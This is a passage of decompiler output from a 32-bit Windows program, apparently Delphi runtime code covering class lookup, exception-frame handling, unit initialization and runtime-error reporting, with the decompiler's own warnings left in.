  int v9; // [esp+0h] [ebp-Ch] BYREF

  v2 = a1;
  *a2 = a1;
  v8 = *(_DWORD *)(a1 - 40);
  memset(a2 + 1, 0, 4 * ((v8 >> 2) - 1) + (v8 & 3));
  result = a2;
  while ( 1 )
  {
    if ( *(_DWORD *)(v2 - 72) )
      v8 = *(_DWORD *)(v2 - 72);
    v4 = *(int **)(v2 - 36);
    if ( !v4 )
      break;
    v2 = *v4;
  }
  if ( &v8 != (unsigned int *)&v9 )
  {
    v5 = *(_DWORD *)v8;
    v6 = (_DWORD *)(v8 + 4);
    do
    {
      v7 = v6[4];
      if ( v7 )
        *(_DWORD *)((char *)a2 + v6[5]) = v7;
      v6 += 7;
      --v5;
    }
    while ( v5 );
  }
  return result;
}

//----- (00403598) --------------------------------------------------------
int __usercall sub_403598@<eax>(int result@<eax>)
{
  int v1; // ebx
  int *v2; // esi
  int v3; // esi
  int v4; // edx

  v1 = result;
  v2 = (int *)result;
  do
  {
    v3 = *v2;
    v4 = *(_DWORD *)(v3 - 64);
    v2 = *(int **)(v3 - 36);
    if ( v4 )
    {
      sub_404CB0(result, v4);
      result = v1;
    }
  }
  while ( v2 );
  return result;
}

//----- (004035B8) --------------------------------------------------------
_DWORD *__usercall sub_4035B8@<eax>(_DWORD *a1@<eax>, unsigned int a2@<edx>, _DWORD *a3@<ecx>)
{
  unsigned int v4; // ecx

  v4 = a2;
  if ( a2 >= 0xFF000000 )
    return sub_405F58(a3, *(_DWORD *)((char *)a1 + (v4 & 0xFFFFFF)));
  if ( v4 < 0xFE000000 )
    return (_DWORD *)((int (*)(void))v4)();
  return (_DWORD *)(*(int (**)(void))(*a1 + (__int16)v4))();
}

//----- (004035E8) --------------------------------------------------------
_DWORD *__usercall sub_4035E8@<eax>(int *a1@<eax>, _DWORD *a2@<edx>, _DWORD *a3@<ecx>)
{
  _DWORD *v5; // eax
  _DWORD *v6; // ebx
  int v7; // eax
  unsigned int v9[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v10; // [esp-4h] [ebp-18h]
  int v11; // [esp+Ch] [ebp-8h] BYREF
  _DWORD *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11 = 0;
  v12 = a2;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_40366C;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  *a3 = 0;
  v5 = sub_40367C(*a1, v12);
  v6 = v5;
  if ( v5 )
  {
    v7 = v5[5];
    if ( v7 )
    {
      *a3 = (char *)a1 + v7;
      if ( *a3 )
        (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a3 + 4))(*a3);
    }
    else
    {
      sub_4035B8(a1, v6[6], &v11);
      sub_405F58(a3, v11);
    }
  }
  LOBYTE(v6) = *a3 != 0;
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_403673;
  sub_405F40(&v11);
  return v6;
}

//----- (0040367C) --------------------------------------------------------
_DWORD *__usercall sub_40367C@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int *v3; // eax
  int v4; // ecx
  _DWORD *result; // eax
  int *v6; // ebx

  while ( 1 )
  {
    v3 = *(int **)(a1 - 72);
    if ( v3 )
      break;
LABEL_8:
    v6 = *(int **)(a1 - 36);
    if ( !v6 )
      return 0;
    a1 = *v6;
  }
  v4 = *v3;
  result = v3 + 1;
  while ( *a2 != *result || a2[1] != result[1] || a2[2] != result[2] || a2[3] != result[3] )
  {
    result += 7;
    if ( !--v4 )
      goto LABEL_8;
  }
  return result;
}

//----- (004036C0) --------------------------------------------------------
bool __usercall sub_4036C0@<al>(int *a1@<eax>, int a2@<edx>)
{
  return a1 && sub_40372C(*a1, a2);
}

//----- (004036E4) --------------------------------------------------------
int __usercall sub_4036E4@<eax>(int a1@<eax>, int a2@<esi>)
{
  int result; // eax
  int i; // esi
  unsigned __int16 *v5; // edi
  int v6; // ecx
  bool v7; // zf
  _WORD *v8; // edi
  int *v9; // esi
  int v10; // [esp-4h] [ebp-8h]

  result = a2;
  for ( i = a1; ; i = *v9 )
  {
    v5 = *(unsigned __int16 **)(i - 48);
    if ( v5 )
    {
      v6 = *v5;
      v10 = v6;
      v7 = v5 + 1 == 0;
      v8 = v5 + 1;
      do
      {
        if ( !v6 )
          break;
        v7 = *v8++ == (unsigned __int16)result;
        --v6;
      }
      while ( !v7 );
      if ( v7 )
        break;
    }
    v9 = *(int **)(i - 36);
    if ( !v9 )
      return result;
  }
  return 2 * v10 - v6;
}

//----- (00403714) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_403714(int *a1@<eax>, int a2@<esi>)
{
  char v2; // zf

  sub_4036E4(*a1, a2);
  if ( !v2 )
    __asm { jmp     esi }
  sub_402A48();
}
// 403724: positive sp value 4 has been found
// 40371F: variable 'v2' is possibly undefined
// 402A48: using guessed type void __noreturn sub_402A48();

//----- (0040372C) --------------------------------------------------------
char __usercall sub_40372C@<al>(int a1@<eax>, int a2@<edx>)
{
  int *v2; // eax

  while ( a1 != a2 )
  {
    v2 = *(int **)(a1 - 36);
    if ( !v2 )
      return (char)v2;
    a1 = *v2;
  }
  LOBYTE(v2) = 1;
  return (char)v2;
}

//----- (00403740) --------------------------------------------------------
int __usercall sub_403740@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 - 60);
}

//----- (00403748) --------------------------------------------------------
int sub_403748()
{
  return -2147418113;
}

//----- (0040375C) --------------------------------------------------------
int __usercall sub_40375C@<eax>(int *a1@<eax>, _WORD *a2@<edx>, int (*a3)(void)@<esi>)
{
  char v3; // zf
  int *v5; // [esp-4h] [ebp-8h]

  LOWORD(a3) = *a2;
  if ( !*a2 )
    return (*(int (**)(void))(*a1 - 16))();
  if ( (unsigned __int16)a3 >= 0xC000u )
    return (*(int (**)(void))(*a1 - 16))();
  v5 = a1;
  sub_4036E4(*a1, (int)a3);
  a1 = v5;
  if ( v3 )
    return (*(int (**)(void))(*a1 - 16))();
  else
    return a3();
}
// 403775: variable 'v3' is possibly undefined

//----- (00403784) --------------------------------------------------------
int *__usercall sub_403784@<eax>(int a1@<eax>, char *a2@<edx>)
{
  int v2; // ecx
  int v3; // edi
  char v4; // bl
  _WORD *v5; // esi
  _WORD *v6; // esi
  int *result; // eax

  HIWORD(v2) = 0;
  HIWORD(v3) = 0;
  v4 = *a2;
  while ( 1 )
  {
    v5 = *(_WORD **)(a1 - 52);
    if ( v5 )
      break;
LABEL_7:
    result = *(int **)(a1 - 36);
    if ( !result )
      return result;
    a1 = *result;
  }
  LOWORD(v3) = *v5;
  v6 = v5 + 1;
  while ( 1 )
  {
    LOBYTE(v2) = *((_BYTE *)v6 + 6);
    if ( (_BYTE)v2 == v4 )
      break;
LABEL_6:
    LOWORD(v2) = *v6;
    v6 = (_WORD *)((char *)v6 + v2);
    if ( !--v3 )
      goto LABEL_7;
  }
  BYTE1(v2) = 0;
  do
  {
    if ( (((unsigned __int8)a2[v2] ^ *((_BYTE *)v6 + v2 + 6)) & 0xDF) != 0 )
    {
      v4 = *a2;
      goto LABEL_6;
    }
    --v2;
  }
  while ( v2 );
  return *(int **)(v6 + 1);
}

//----- (004037D4) --------------------------------------------------------
_DWORD *__usercall sub_4037D4@<eax>(_DWORD *result@<eax>, int a2@<edx>, _BYTE *a3@<ecx>)
{
  _BYTE *v3; // edi
  int v4; // ebx
  _WORD *v5; // esi
  _WORD *v6; // esi

  v3 = a3;
  HIWORD(v4) = 0;
  HIWORD(a3) = 0;
  while ( 1 )
  {
    v5 = (_WORD *)*(result - 13);
    if ( v5 )
      break;
LABEL_7:
    result = (_DWORD *)*(result - 9);
    if ( !result )
    {
      *v3 = 0;
      return result;
    }
    result = (_DWORD *)*result;
  }
  LOWORD(a3) = *v5;
  v6 = v5 + 1;
  while ( a2 != *(_DWORD *)(v6 + 1) )
  {
    LOWORD(v4) = *v6;
    v6 = (_WORD *)((char *)v6 + v4);
    if ( !--a3 )
      goto LABEL_7;
  }
  qmemcpy(v3, v6 + 3, *((unsigned __int8 *)v6 + 6) + 1);
  return result;
}

//----- (00403814) --------------------------------------------------------
_DWORD *__usercall sub_403814@<eax>(_DWORD *result@<eax>, char *a2@<edx>)
{
  int v2; // ecx
  int v3; // edi
  char v4; // bl
  int v5; // eax
  _WORD *v6; // esi
  _WORD *v7; // esi
  _DWORD *v8; // [esp-4h] [ebp-10h]

  v2 = 0;
  HIWORD(v3) = 0;
  v4 = *a2;
  v8 = result;
  while ( 1 )
  {
    v5 = *result;
    v6 = *(_WORD **)(v5 - 56);
    if ( v6 )
      break;
LABEL_6:
    result = *(_DWORD **)(v5 - 36);
    if ( !result )
      return result;
  }
  LOWORD(v3) = *v6;
  v7 = v6 + 3;
  while ( 1 )
  {
    LOBYTE(v2) = *((_BYTE *)v7 + 6);
    if ( (_BYTE)v2 == v4 )
      break;
LABEL_5:
    v7 = (_WORD *)((char *)v7 + v2 + 7);
    if ( !--v3 )
      goto LABEL_6;
  }
  do
  {
    if ( (((unsigned __int8)a2[v2] ^ *((_BYTE *)v7 + v2 + 6)) & 0xDF) != 0 )
    {
      v4 = *a2;
      LOBYTE(v2) = *((_BYTE *)v7 + 6);
      goto LABEL_5;
    }
    --v2;
  }
  while ( v2 );
  return (_DWORD *)((char *)v8 + *(_DWORD *)v7);
}

//----- (00403864) --------------------------------------------------------
int __usercall sub_403864@<eax>(int result@<eax>, char a2@<dl>, char a3)
{
  if ( a2 >= 0 )
    result = (*(int (**)(void))(result - 12))();
  __writefsdword(0, (unsigned int)&a3);
  return result;
}

//----- (004038B4) --------------------------------------------------------
int __usercall sub_4038B4@<eax>(_DWORD *a1@<eax>)
{
  return (*(int (**)(void))(*a1 - 8))();
}

//----- (004038BC) --------------------------------------------------------
_DWORD *__usercall sub_4038BC@<eax>(_DWORD *a1@<eax>)
{
  (*(void (**)(void))(*a1 - 28))();
  return a1;
}

//----- (004038CC) --------------------------------------------------------
_DWORD *__usercall sub_4038CC@<eax>(_DWORD *result@<eax>, char a2@<dl>)
{
  _DWORD *v2; // [esp-4h] [ebp-4h]

  if ( a2 > 0 )
  {
    v2 = result;
    (*(void (**)(void))(*result - 24))();
    return v2;
  }
  return result;
}

//----- (004038DC) --------------------------------------------------------
int sub_4038DC()
{
  int result; // eax

  if ( (unsigned __int8)byte_42B014 > 1u )
    return dword_42C014(250477279, 0, 0, 0);
  return result;
}
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004038F8) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_4038F8(int a1@<eax>, int a2@<edx>)
{
  _DWORD v2[3]; // [esp-Ch] [ebp-Ch] BYREF

  if ( byte_42B014 )
  {
    v2[1] = a1;
    v2[0] = a2;
    dword_42C014(250477284, 0, 2, v2);
  }
}
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403934) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_403934(int a1@<ebx>)
{
  int v1; // [esp-8h] [ebp-8h] BYREF

  if ( (unsigned __int8)byte_42B014 > 1u )
  {
    v1 = *(_DWORD *)(a1 + 4);
    dword_42C014(250477280, 0, 1, &v1);
  }
}
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403948) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_403948(int a1@<ebx>)
{
  int v1; // [esp-8h] [ebp-8h] BYREF

  if ( (unsigned __int8)byte_42B014 > 1u )
  {
    v1 = a1;
    dword_42C014(250477280, 0, 1, &v1);
  }
}
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040395C) --------------------------------------------------------
void sub_40395C()
{
  ;
}

//----- (0040397C) --------------------------------------------------------
void __fastcall __spoils<edx,ecx> sub_40397C(int a1, int a2)
{
  int v2; // ecx
  _DWORD v3[4]; // [esp-10h] [ebp-10h] BYREF

  if ( (unsigned __int8)byte_42B014 > 1u )
  {
    v3[2] = a2;
    v3[1] = a1;
    sub_40395C();
    v3[0] = v2;
    dword_42C014(250477281, 0, 1, v3);
  }
}
// 40398D: variable 'v2' is possibly undefined
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004039A4) --------------------------------------------------------
void __fastcall sub_4039A4(int a1, int a2)
{
  int v2; // [esp-4h] [ebp-4h] BYREF

  if ( (unsigned __int8)byte_42B014 > 1u )
  {
    v2 = a2;
    dword_42C014(250477282, 0, 1, &v2);
  }
}
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004039C0) --------------------------------------------------------
void __spoils<ecx> sub_4039C0()
{
  int v0; // [esp-8h] [ebp-8h] BYREF

  if ( (unsigned __int8)byte_42B014 > 1u )
    dword_42C014(250477283, 0, 2, &v0);
}
// 42B014: using guessed type char byte_42B014;
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004039E0) --------------------------------------------------------
int __usercall sub_4039E0@<eax>(
        int a1@<ebx>,
        int a2@<ebp>,
        int a3@<edi>,
        int a4@<esi>,
        struct _EXCEPTION_POINTERS ExceptionInfo,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13)
{
  PEXCEPTION_RECORD ExceptionRecord; // eax
  ULONG_PTR v14; // edx
  PVOID ExceptionAddress; // ecx
  int v16; // eax
  bool v17; // zf
  int v18; // edi
  int *v19; // eax
  int v20; // ebx
  PVOID v22; // [esp-4h] [ebp-Ch]
  ULONG_PTR v23; // [esp+0h] [ebp-8h]
  EXCEPTION_RECORD *v24; // [esp+4h] [ebp-4h] BYREF

  ExceptionRecord = ExceptionInfo.ExceptionRecord;
  if ( (ExceptionInfo.ExceptionRecord->ExceptionFlags & 6) != 0 )
    return 1;
  v14 = ExceptionInfo.ExceptionRecord->ExceptionInformation[1];
  ExceptionAddress = (PVOID)ExceptionInfo.ExceptionRecord->ExceptionInformation[0];
  if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250477278 )
  {
    sub_403470();
    if ( !dword_42C010 )
      return 1;
    v16 = dword_42C010();
    if ( !v16 )
      return 1;
    if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250608334 )
    {
      sub_4038F8(v16, a6);
      if ( byte_42B018 )
      {
        if ( !byte_42B014 )
        {
          v24 = (EXCEPTION_RECORD *)v16;
          if ( UnhandledExceptionFilter(&ExceptionInfo) )
          {
            v14 = (ULONG_PTR)v24;
            ExceptionRecord = ExceptionInfo.ExceptionRecord;
            ExceptionAddress = ExceptionInfo.ExceptionRecord->ExceptionAddress;
            goto LABEL_14;
          }
          return 1;
        }
      }
    }
    v14 = v16;
    ExceptionRecord = ExceptionInfo.ExceptionRecord;
    ExceptionAddress = ExceptionInfo.ExceptionRecord->ExceptionAddress;
  }
  if ( (unsigned __int8)byte_42B018 <= 1u
    || byte_42B014
    || (v24 = ExceptionRecord,
        v23 = v14,
        v22 = ExceptionAddress,
        v17 = UnhandledExceptionFilter(&ExceptionInfo) == 0,
        ExceptionAddress = v22,
        v14 = v23,
        ExceptionRecord = v24,
        !v17) )
  {
LABEL_14:
    ExceptionRecord->ExceptionFlags |= 2u;
    dword_42C018(
      ExceptionInfo.ContextRecord,
      &loc_403AB8,
      ExceptionRecord,
      0,
      ExceptionAddress,
      v14,
      ExceptionRecord,
      NtCurrentTeb()->NtTib.ExceptionList,
      a2,
      a3,
      a4,
      a1);
    v18 = a13;
    v19 = (int *)sub_40656C();
    v24 = (EXCEPTION_RECORD *)*v19;
    *v19 = (int)&v24;
    v20 = *(_DWORD *)(v18 + 4);
    *(_DWORD *)(v18 + 4) = &loc_403AE4;
    v20 += 5;
    sub_403948(v20);
    __asm { jmp     ebx }
  }
  return 1;
}
// 42B014: using guessed type char byte_42B014;
// 42B018: using guessed type char byte_42B018;
// 42C010: using guessed type int (*dword_42C010)(void);
// 42C018: using guessed type int (__stdcall *dword_42C018)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403C94) --------------------------------------------------------
int __cdecl sub_403C94(int a1, int a2)
{
  int v2; // ecx
  void (*v3)(void); // ecx

  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    v2 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a2 + 4) = &loc_403CC4;
    sub_40397C(v2 + 5, a2);
    v3();
  }
  return 1;
}
// 403CBE: variable 'v3' is possibly undefined

//----- (00403CCC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_403CCC@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5)
{
  if ( !a1 )
    sub_404260();
  return dword_42C014(a2, a3, a4, a5);
}
// 403CDB: positive sp value 4 has been found
// 404260: using guessed type void __noreturn sub_404260(void);
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403CF4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __cdecl sub_403CF4(int a1, int a2)
{
  _DWORD **v2; // eax
  _DWORD *v3; // edx
  _DWORD *v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD **v6; // [esp-14h] [ebp-14h]

  *(_DWORD *)(a2 + 4) = &loc_403D3F;
  v2 = (_DWORD **)sub_40656C();
  v3 = *v2;
  *v2 = (_DWORD *)**v2;
  v4 = (_DWORD *)v3[3];
  v4[1] &= ~2u;
  if ( *v4 != 250477278 )
  {
    sub_403534((_DWORD *)v3[2]);
    sub_4038DC();
  }
  *v6 = NtCurrentTeb()->NtTib.ExceptionList->Next;
  return 1;
}
// 403D3F: positive sp value 28 has been found
// 403CF4: could not find valid save-restore pair for ebx
// 403CF4: could not find valid save-restore pair for ebp
// 403CF4: could not find valid save-restore pair for edi
// 403CF4: could not find valid save-restore pair for esi
// 403D39: variable 'v6' is possibly undefined

//----- (00403D48) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_403D48(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12)
{
  _DWORD **v12; // eax
  _DWORD *v13; // edx
  unsigned int v15; // [esp-10h] [ebp-10h]
  int v16; // [esp-4h] [ebp-4h]

  v12 = (_DWORD **)sub_40656C();
  v13 = *v12;
  *v12 = (_DWORD *)**v12;
  sub_403534((_DWORD *)v13[2]);
  __writefsdword(0, v15);
  sub_4039A4(v15, v16);
  __asm { jmp     edx }
}
// 403D64: positive sp value 4 has been found
// 403D75: unbalanced stack, ignored a potential tail call
// 403D6B: variable 'v15' is possibly undefined
// 403D70: variable 'v16' is possibly undefined

//----- (00403D78) --------------------------------------------------------
int __stdcall sub_403D78(unsigned int a1, int a2, int a3)
{
  __writefsdword(0, a1);
  return ((int (*)(void))(a2 + 5))();
}

//----- (00403D90) --------------------------------------------------------
void __thiscall __noreturn sub_403D90(void *this, int *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  unsigned int v5; // eax
  bool v6; // cf
  unsigned int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  unsigned __int8 v11; // al

  v2 = *a2;
  if ( *a2 > -1073741678 )
  {
    if ( v2 > -1073741674 )
    {
      v10 = v2 + 1073741571;
      if ( !v10 )
      {
        v11 = -54;
        goto LABEL_33;
      }
      if ( v10 == 61 )
      {
        v11 = -39;
        goto LABEL_33;
      }
    }
    else
    {
      if ( v2 == -1073741674 )
      {
        v11 = -38;
        goto LABEL_33;
      }
      v8 = v2 + 1073741677;
      if ( !v8 )
        goto LABEL_27;
      v9 = v8 - 1;
      if ( !v9 )
      {
        v11 = -56;
        goto LABEL_33;
      }
      if ( v9 == 1 )
      {
        v11 = -41;
        goto LABEL_33;
      }
    }
  }
  else
  {
    if ( *a2 == -1073741678 )
      goto LABEL_24;
    if ( v2 <= -1073741682 )
    {
      if ( v2 == -1073741682 )
      {
        v11 = -56;
        goto LABEL_33;
      }
      v3 = v2 + 1073741819;
      if ( !v3 )
      {
        v11 = -40;
        goto LABEL_33;
      }
      v4 = v3 - 135;
      if ( !v4 )
      {
        v11 = -55;
        goto LABEL_33;
      }
      if ( v4 != 1 )
        goto LABEL_32;
LABEL_27:
      v11 = -50;
      goto LABEL_33;
    }
    v5 = v2 + 1073741681;
    v6 = v5 < 2;
    v7 = v5 - 2;
    if ( v6 )
    {
LABEL_24:
      v11 = -49;
      goto LABEL_33;
    }
    if ( !v7 )
    {
      v11 = -51;
      goto LABEL_33;
    }
  }
LABEL_32:
  v11 = -1;
LABEL_33:
  sub_402790(v11, a2[3], this);
}

//----- (00403E30) --------------------------------------------------------
#error "403E70: call analysis failed (funcsize=44)"

//----- (00403ED0) --------------------------------------------------------
struct _EXCEPTION_REGISTRATION_RECORD **__usercall sub_403ED0@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<ebp>)
{
  struct _EXCEPTION_REGISTRATION_RECORD **result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = (struct _EXCEPTION_REGISTRATION_RECORD **)&a1[-2].Handler;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&a1[-2].Handler);
  *result = ExceptionList;
  result[1] = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_403E30;
  result[2] = a1;
  dword_42C630 = (int)&a1[-2].Handler;
  return result;
}
// 42C630: using guessed type int dword_42C630;

//----- (00403EF0) --------------------------------------------------------
int sub_403EF0()
{
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = dword_42C630;
  if ( dword_42C630 )
  {
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    if ( (struct _EXCEPTION_REGISTRATION_RECORD *)dword_42C630 == ExceptionList )
    {
      result = *(_DWORD *)dword_42C630;
      __writefsdword(0, *(_DWORD *)dword_42C630);
    }
    else
    {
      while ( ExceptionList != (struct _EXCEPTION_REGISTRATION_RECORD *)-1 )
      {
        if ( ExceptionList->Next == (struct _EXCEPTION_REGISTRATION_RECORD *)dword_42C630 )
        {
          result = *(_DWORD *)dword_42C630;
          ExceptionList->Next = *(struct _EXCEPTION_REGISTRATION_RECORD **)dword_42C630;
          return result;
        }
        ExceptionList = ExceptionList->Next;
      }
    }
  }
  return result;
}
// 42C630: using guessed type int dword_42C630;

//----- (00403F18) --------------------------------------------------------
int sub_403F18()
{
  int result; // eax
  int v1; // ebx
  int v2; // esi
  void (__cdecl *v3)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *); // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v5; // [esp-8h] [ebp-14h]
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = (int)*(&dword_42C62C + 2);
  if ( result )
  {
    v1 = (int)*(&dword_42C62C + 3);
    v2 = *(_DWORD *)(result + 4);
    v6 = &savedregs;
    v5 = &loc_403F5E;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    while ( v1 > 0 )
    {
      *(&dword_42C62C + 3) = (const void *)--v1;
      v3 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(v2 + 8 * v1 + 4);
      if ( v3 )
        v3(ExceptionList, v5, v6);
    }
    result = 0;
    __writefsdword(0, (unsigned int)ExceptionList);
  }
  return result;
}
// 42C62C: using guessed type const void *dword_42C62C;

//----- (00403F78) --------------------------------------------------------
int sub_403F78()
{
  int result; // eax
  int v1; // esi
  int v2; // ebx
  int v3; // edi
  void (*v4)(void); // eax
  unsigned int v5[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = dword_42C634;
  if ( dword_42C634 )
  {
    v1 = *(_DWORD *)dword_42C634;
    v2 = 0;
    v3 = *(_DWORD *)(dword_42C634 + 4);
    v5[2] = (unsigned int)&savedregs;
    v5[1] = (unsigned int)&loc_403FBE;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    if ( v1 > 0 )
    {
      do
      {
        v4 = *(void (**)(void))(v3 + 8 * v2++);
        dword_42C638 = v2;
        if ( v4 )
          v4();
      }
      while ( v1 > v2 );
    }
    result = 0;
    __writefsdword(0, v5[0]);
  }
  return result;
}
// 42C634: using guessed type int dword_42C634;
// 42C638: using guessed type int dword_42C638;

//----- (00403FD8) --------------------------------------------------------
int __usercall sub_403FD8@<eax>(int a1@<eax>, int a2@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *a3@<ebp>)
{
  dword_42C014 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))RaiseException;
  dword_42C018 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))RtlUnwind;
  dword_42C634 = a1;
  dword_42C638 = 0;
  dword_42C63C = a2;
  dword_42C02C = *(_DWORD *)(a2 + 4);
  sub_403ED0(a3);
  byte_42C034 = 0;
  return sub_403F78();
}
// 42C014: using guessed type int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD);
// 42C018: using guessed type int (__stdcall *dword_42C018)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 42C02C: using guessed type int dword_42C02C;
// 42C034: using guessed type char byte_42C034;
// 42C634: using guessed type int dword_42C634;
// 42C638: using guessed type int dword_42C638;
// 42C63C: using guessed type int dword_42C63C;

//----- (00404018) --------------------------------------------------------
int **__usercall sub_404018@<eax>(_DWORD *a1@<eax>)
{
  int v1; // edi
  char ***v2; // esi
  int **result; // eax

  v1 = *a1;
  v2 = (char ***)(a1 + 1);
  do
  {
    result = sub_4063D4((int **)*v2[1], *v2);
    v2 += 2;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (00404040) --------------------------------------------------------
int __usercall sub_404040@<eax>(int *a1@<eax>)
{
  int v1; // edi
  _DWORD *v2; // esi
  int result; // eax

  v1 = *a1;
  v2 = a1 + 1;
  do
  {
    result = v2[2] + *(_DWORD *)v2[1];
    *(_DWORD *)*v2 = result;
    v2 += 3;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (00404064) --------------------------------------------------------
unsigned int __fastcall sub_404064(int a1)
{
  int v1; // ebx
  unsigned int result; // eax

  LOBYTE(a1) = 16;
  v1 = dword_42B000;
  do
  {
    Text[(unsigned __int8)a1] = v1 % 10 + 48;
    v1 /= 10;
    --a1;
  }
  while ( v1 );
  LOBYTE(a1) = 28;
  result = dword_42B004;
  do
  {
    Text[(unsigned __int8)a1] = byte_42B07C[result & 0xF];
    result >>= 4;
    --a1;
  }
  while ( result );
  return result;
}
// 42B000: using guessed type int dword_42B000;
// 42B004: using guessed type int dword_42B004;

//----- (004040C0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __stdcall sub_4040C0(int a1, int a2, int a3)
{
  BOOL result; // eax

  result = _InterlockedExchange(&dword_42B000, 0) == 0;
  qmemcpy(&dword_42C62C, dword_42C62C, 0x2Cu);
  return result;
}
// 4040EA: positive sp value 4 has been found
// 4040C0: could not find valid save-restore pair for ebp
// 4040C0: could not find valid save-restore pair for edi
// 4040C0: could not find valid save-restore pair for esi
// 42B000: using guessed type int dword_42B000;
// 42C62C: using guessed type const void *dword_42C62C;

//----- (004040F0) --------------------------------------------------------
void __thiscall sub_4040F0(void *this)
{
  HANDLE StdHandle; // eax
  HANDLE v2; // eax
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesWritten = (DWORD)this;
  if ( byte_42C044 )
  {
    if ( word_42C218 == -10318 )
    {
      if ( dword_42C220 )
        dword_42C230();
    }
    StdHandle = GetStdHandle(0xFFFFFFF5);
    WriteFile(StdHandle, Text, 0x1Eu, &NumberOfBytesWritten, 0);
    v2 = GetStdHandle(0xFFFFFFF5);
    WriteFile(v2, &dword_404178, 2u, &NumberOfBytesWritten, 0);
  }
  else if ( !byte_42B01C )
  {
    MessageBoxA(0, Text, Caption, 0);
  }
}
// 404178: using guessed type int dword_404178;
// 42B01C: using guessed type char byte_42B01C;
// 42C044: using guessed type char byte_42C044;
// 42C218: using guessed type __int16 word_42C218;
// 42C220: using guessed type int dword_42C220;
// 42C230: using guessed type int (*dword_42C230)(void);

//----- (0040417C) --------------------------------------------------------
void __thiscall __noreturn sub_40417C(void *this)
{
  void (*v1)(void); // eax
  void *v2; // ecx
  _DWORD *v3; // eax
  int v4; // edx
  int v5; // eax
  int v6; // [esp+0h] [ebp-10h]
  int v7; // [esp+4h] [ebp-Ch]
  int *v8; // [esp+8h] [ebp-8h]

  if ( !*((_BYTE *)&dword_42C62C + 40) && unk_42C040 )
  {
    do
    {
      v1 = (void (*)(void))unk_42C040;
      unk_42C040 = 0;
      v1();
    }
    while ( unk_42C040 );
  }
